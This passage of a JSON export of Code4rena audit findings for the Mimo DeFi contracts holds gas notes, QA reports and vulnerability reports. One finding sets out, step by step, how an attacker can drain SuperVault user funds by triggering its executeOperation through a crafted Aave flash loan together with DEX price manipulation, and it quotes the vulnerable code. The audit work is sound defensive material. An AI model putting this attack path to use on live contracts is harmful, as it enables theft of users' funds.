x = 0 costs more gas than uint x without having any different functionality.\n\n## Proof of Concept\n\n```\n  2022-04-mimo-main/core/contracts/inception/InceptionVaultsCore.sol::218 => uint256 insuranceAmount = 0;\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nuint x = 0 costs more gas than uint x without having any different functionality.\n\n\n# C4-006 : Check if amount > 0 before token transfer can save gas\n\n## Impact\n\nSince _amount can be 0. Checking if (_amount != 0) before the transfer can potentially save an external call and the unnecessary gas cost of a 0 token transfer.\n\n## Proof of Concept\n\n```\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::58 => _par.approve(address(_a.parallel().core()), uint256(-1));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::125 => collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::320 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::323 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::97 => asset.approve(address(lendingPool), flashloanRepayAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::129 => IERC20(asset).transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::149 => IERC20(toCollateral).approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::199 => par.approve(address(a.core()), par.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::233 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::237 => collateral.transfer(msg.sender, collateral.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::247 => require(asset.transfer(msg.sender, amount));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::255 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::264 => require(token.transfer(msg.sender, token.balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::273 => token.approve(address(a.core()), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::274 => token.transferFrom(msg.sender, address(this), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::289 => token.approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::290 => token.transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::292 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::313 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::326 => token.approve(address(a.core()), 2**256 - 1);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::345 => token.approve(proxy, amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::370 => require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\n\n```\n\nAll Contracts\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider checking amount != 0.\n\n\n# C4-007: Use of constant keccak variables results in extra hashing (and so gas).\n\n## Impact\n\nThat would Increase gas costs on all privileged operations.\n\n## Proof of Concept\n\nThe following role variables are marked as constant.\n\n```\n 2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuyBack.sol::11 => bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\n  2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuybackUniswapV2.sol::11 => bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\n  2022-04-mimo-main/core/contracts/liquidityMining/MinerPayer.sol::20 => bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\n\n```\n\nThis results in the keccak operation being performed whenever the variable is used, increasing gas costs relative to just storing the output hash. Changing to immutable will only perform hashing on contract deployment which will save gas.\n\nSee: ethereum/solidity#9232 (https://github.com/ethereum/solidity/issues/9232#issuecomment-646131646)\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to change the variable to be immutable rather than constant.\n\n# C4-008 : Non-strict inequalities are cheaper than strict ones\n\n## Impact\n\nStrict inequalities add a check of non equality which costs around 3 gas.\n\n## Proof of Concept\n\n```\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::52 => require(boostConfig.a >= 1 && boostConfig.d > 0 && boostConfig.maxBoost >= 1, \"LM004\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::71 => require(newBoostConfig.a >= 1 && newBoostConfig.d > 0 && newBoostConfig.maxBoost >= 1, \"LM004\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::254 => require(_value > 0, \"LM101\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::267 => if (pendingPAR > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::284 => require(_value > 0, \"LM101\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::314 => if (_userInfo.stakeWithBoost > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::319 => if (pendingPAR > 0 && !_restakePAR) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::322 => if (pendingMIMO > 0) {\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::333 => if (_userInfo.stakeWithBoost > 0) {\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse >= or <= instead of > and < when possible.",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/129"
    }
  },
  {
    "title": "Non-standard ERC20 Tokens are Not Supported",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/supervaults/contracts/SuperVault.sol#L97\n\n\n# Vulnerability details\n\nWhen trying to call `SuperVault.executeOperation`  the transaction reverts. This is because the call to `asset.approve()` in line{97} doesn't match the expected function signature of `approve()` on the target contract like in the case of USDT.\n\nThis issue exists in any call to approve function when the asset could be any ERC20.\n\nRecommendation : consider using safeApprove of OZ\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/127"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 :Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\n## Impact -  LOW\n\n## Impact\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n2. transfer/transferFrom functions are used instead of safe transfer/transferFrom on the following contracts.\n\n```\n  2022-04-mimo-main/core/contracts/liquidityMining/MinerPayer.sol::91 => a.mimo().transfer(_payee, payment);\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::77 => require(a.mimo().transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::91 => require(par.transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::184 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::187 => require(par.transfer(user, pendingPAR));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::232 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PolygonDistributor.sol::47 => a.mimo().approve(erc20Predicate, payment);\n  2022-04-mimo-main/core/contracts/liquidityMining/VotingMiner.sol::33 => require(a.mimo().transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::220 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::223 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::58 => _par.approve(address(_a.parallel().core()), uint256(-1));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::125 => collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::320 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::323 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::44 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::47 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using safeTransfer/safeTransferFrom or require() consistently.\n\n\n# C4-002 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/inception/InceptionVaultsCore.sol#L51\n\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n\n# C4-003 : # Missing Re-entrancy Guard\n\n## Impact - LOW\n\nThe re-entrancy guard is missing on the some of the functions. The external interactions can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/liquidityMining/PARMiner.sol#L52\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/liquidityMining/PARMiner.sol#L61\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n\n# C4-004 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\n 2022-04-mimo-main/supervaults/contracts/SuperVault.sol::97 => asset.approve(address(lendingPool), flashloanRepayAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::129 => IERC20(asset).transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::149 => IERC20(toCollateral).approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::199 => par.approve(address(a.core()), par.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::233 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::237 => collateral.transfer(msg.sender, collateral.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::247 => require(asset.transfer(msg.sender, amount));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::255 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::264 => require(token.transfer(msg.sender, token.balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::273 => token.approve(address(a.core()), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::274 => token.transferFrom(msg.sender, address(this), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::289 => token.approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::290 => token.transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::292 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::313 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::326 => token.approve(address(a.core()), 2**256 - 1);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::345 => token.approve(proxy, amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::370 => require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n# C4-005 : # Pragma Version\n\n## Impact\n\nIn the contracts, floating pragmas should not be used. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\n## ## Proof of Concept\n\nhttps://swcregistry.io/docs/SWC-103\n\n```\nAll Contracts\n```\n\n## Tools Used\nManual code review\n\n## Recommended Mitigation Steps\nLock the pragma version: delete pragma solidity 0.8.10 in favor of pragma solidity 0.8.10\n\n# C4-006 : # The Contract Should Approve(0) first\n\n## Impact\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\n 2022-04-mimo-main/supervaults/contracts/SuperVault.sol::97 => asset.approve(address(lendingPool), flashloanRepayAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::129 => IERC20(asset).transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::149 => IERC20(toCollateral).approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::199 => par.approve(address(a.core()), par.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::233 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::237 => collateral.transfer(msg.sender, collateral.balanceOf(address(this)));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::247 => require(asset.transfer(msg.sender, amount));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::255 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::264 => require(token.transfer(msg.sender, token.balanceOf(address(this))));\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::273 => token.approve(address(a.core()), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::274 => token.transferFrom(msg.sender, address(this), amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::289 => token.approve(address(a.core()), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::290 => token.transferFrom(msg.sender, address(this), depositAmount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::292 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::313 => require(IERC20(a.stablex()).transfer(msg.sender, IERC20(a.stablex()).balanceOf(address(this)))); //par\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::326 => token.approve(address(a.core()), 2**256 - 1);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::345 => token.approve(proxy, amount);\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::370 => require(ga.mimo().transfer(msg.sender, ga.mimo().balanceOf(address(this))));\n\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::220 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::223 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::58 => _par.approve(address(_a.parallel().core()), uint256(-1));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::125 => collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::320 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::323 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::44 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::47 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n\n```\n\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n# C4-007 : # USE SAFEERC20.SAFEAPPROVE\n\n## Impact\n\nThis is probably an oversight since SafeERC20 was imported and safeTransfer() was used for ERC20 token transfers. Nevertheless, note that approve() will fail for certain token implementations that do not return a boolean value (). Hence it is recommend to use safeApprove().\n\n\n## Proof of Concept\n\n\n```\n  2022-04-mimo-main/core/contracts/liquidityMining/GenericMiner.sol::47 => require(a.mimo().transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/GenericMiner.sol::102 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/GenericMiner.sol::129 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuyBack.sol::36 => PAR.approve(address(balancer), 2**256 - 1);\n  2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuyBack.sol::51 => require(MIMO.transfer(destination, MIMO.balanceOf(address(this))));\n  2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuybackUniswapV2.sol::35 => PAR.approve(address(router), 2**256 - 1);\n  2022-04-mimo-main/core/contracts/liquidityMining/MIMOBuybackUniswapV2.sol::50 => require(MIMO.transfer(destination, MIMO.balanceOf(address(this))));\n  2022-04-mimo-main/core/contracts/liquidityMining/MinerPayer.sol::91 => a.mimo().transfer(_payee, payment);\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::77 => require(a.mimo().transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::91 => require(par.transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::184 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::187 => require(par.transfer(user, pendingPAR));\n  2022-04-mimo-main/core/contracts/liquidityMining/PARMiner.sol::232 => require(a.mimo().transfer(user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/PolygonDistributor.sol::47 => a.mimo().approve(erc20Predicate, payment);\n  2022-04-mimo-main/core/contracts/liquidityMining/VotingMiner.sol::33 => require(a.mimo().transfer(_user, pending));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::220 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/GenericMinerV2.sol::223 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::58 => _par.approve(address(_a.parallel().core()), uint256(-1));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::125 => collateralToken.approve(proxy, collateralToken.balanceOf(address(this)));\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::320 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/PARMinerV2.sol::323 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::44 => require(_a.mimo().transfer(_user, pendingMIMO), \"LM100\");\n  2022-04-mimo-main/core/contracts/liquidityMining/v2/VotingMinerV2.sol::47 => require(_par.transfer(_user, pendingPAR), \"LM100\");\n\n\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nUpdate to _token.safeApprove(spender, type(uint256).max) \n\n\n# C4-008 : #  USE OF DEPRECATED _SETUPROLE FUNCTION\n\n## Impact\nThe contract SuperVault.sol make use of the deprecated function _setupRole from the AccessControl contract. As per the AccessControl.sol contract documentation, this function is deprecated:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/AccessControl.sol#L183\n\nUsing deprecated functions may eventually produce an unwanted behaviour, for example, if OpenZeppelin decides to remove or update the function.\n\n## Proof of Concept\n\n```\n  2022-04-mimo-main/supervaults/contracts/SuperVault.sol::66 => _setupRole(DEFAULT_ADMIN_ROLE, _owner);\n\n```\n\n\n## Tools Used\nManual testing\n\n## Recommended Mitigation Steps\nIt is recommended to use the _grantRole function instead.\n\n# C4-009 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/core/contracts/inception/InceptionVaultsCore.sol#L40\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/supervaults/contracts/SuperVault.sol#L49\n\n```\n\n2. initialize functions does not have access control. They are vulnerable to front-running.\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n\n# C4-010 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe functions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/supervaults/contracts/SuperVault.sol#L264\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/supervaults/contracts/SuperVault.sol#L253\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/main/supervaults/contracts/SuperVault.sol#L244\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/124"
    }
  },
  {
    "title": "Fund loss or theft by attacker with creating a flash loan and setting SuperVault as receiver so executeOperation()  will be get called by lendingPool but with attackers specified params",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-mimo/blob/b18670f44d595483df2c0f76d1c57a7bfbfbc083/supervaults/contracts/SuperVault.sol#L76-L99\n\n\n# Vulnerability details\n\n## Impact\nAccording to Aave documentation, when requesting flash-loan, it's possible to specify a `receiver`, so function `executeOperation()` of that `receiver` will be called by `lendingPool`.\nhttps://docs.aave.com/developers/v/2.0/guides/flash-loans\nIn the `SuperVault` there is no check to prevent this attack so attacker can use this and perform  `griefing attack` and make miner contract lose all its funds. or he can create specifically crafted `params` so when `executeOperation()` is called by `lendingPool`, attacker could steal vault's user funds.\n\n\n## Proof of Concept\nTo exploit this attacker will do this steps:\n1. will call `Aave lendingPool` to get a flash-loan and specify `SuperVault` as `receiver` of flash-loan. and also create a specific `params` that invoke `Operation.REBALANCE` action to change user vault's collateral.\n2. `lendingPool` will call `executeOperation()` of `SuperVault` with attacker specified data.\n3. `executeOperation()` will check `msg.sender` and will process the function call which will cause some dummy exchanges that will cost user exchange fee and flash-loan fee.\n4. attacker will repeat this attack until user losses all his funds.\n```\n  function executeOperation(\n    address[] calldata assets,\n    uint256[] calldata amounts,\n    uint256[] calldata premiums,\n    address,\n    bytes calldata params\n  ) external returns (bool) {\n    require(msg.sender == address(lendingPool), \"SV002\");\n    (Operation operation, bytes memory operationParams) = abi.decode(params, (Operation, bytes));\n    IERC20 asset = IERC20(assets[0]);\n    uint256 flashloanRepayAmount = amounts[0] + premiums[0];\n    if (operation == Operation.LEVERAGE) {\n      leverageOperation(asset, flashloanRepayAmount, operationParams);\n    }\n    if (operation == Operation.REBALANCE) {\n      rebalanceOperation(asset, amounts[0], flashloanRepayAmount, operationParams);\n    }\n    if (operation == Operation.EMPTY) {\n      emptyVaultOperation(asset, amounts[0], flashloanRepayAmount, operationParams);\n    }\n\n    asset.approve(address(lendingPool), flashloanRepayAmount);\n    return true;\n  }\n```\n\nTo steal user fund in `SupperVault` attacker needs more steps. in all these actions (`Operation.REBALANCE`, `Operation.LEVERAGE`, `Operation.EMPTY`) contract will call `aggregatorSwap()` with data that are controlled by attacker.\n```\n  function aggregatorSwap(\n    uint256 dexIndex,\n    IERC20 token,\n    uint256 amount,\n    bytes memory dexTxData\n  ) internal {\n    (address proxy, address router) = _dexAP.dexMapping(dexIndex);\n    require(proxy != address(0) && router != address(0), \"SV201\"); \n    token.approve(proxy, amount);\n    router.call(dexTxData);\n  }\n```\n\nAttacker can put special data in `dexTxData` that make contract to do an exchange with bad price. To do this, attacker will create a smart contract that will do this steps:\n1. manipulate price in exchange with flash loan.\n2. make a call to `executeOperation()` by `Aave flash-loan` with `receiver` and specific `params` so that `SuperVault` will make calls to manipulated exchange for exchanging.\n3. do the reverse of #1 and pay the flash-loan and steal the user fund.\nThe details are:\nAttacker can manipulate swapping pool price with flash-loan, then Attacker will create specific `params` and perform steps 1 to 4. so contract will try to exchange tokens and because of attacker price manipulation and specific `dexTxData`, contract will have bad deals.\nAfter that, attacker can reverse the process of swap manipulation and get his  flash-loan tokens and some of `SuperVault` funds and. then pay the flash-loan.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nThere should be some state variable which stores the fact that `SuperVault` imitated flash-loan.\nWhen contract tries to start flash-loan, it sets the `isFlash` to `True` and `executeOperation()` only accepts calls if `isFlash` is `True`. and after the flash loan code will set `isFlash` to `False.`\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-mimo-findings",
      "repo": "https://github.com/code-423n4/2022-04-mimo-findings",
      "url": "https://github.com/code-423n4/2022-04-mimo-findings/issues/123"
    }
  },
  {
    "title": "QA Report",
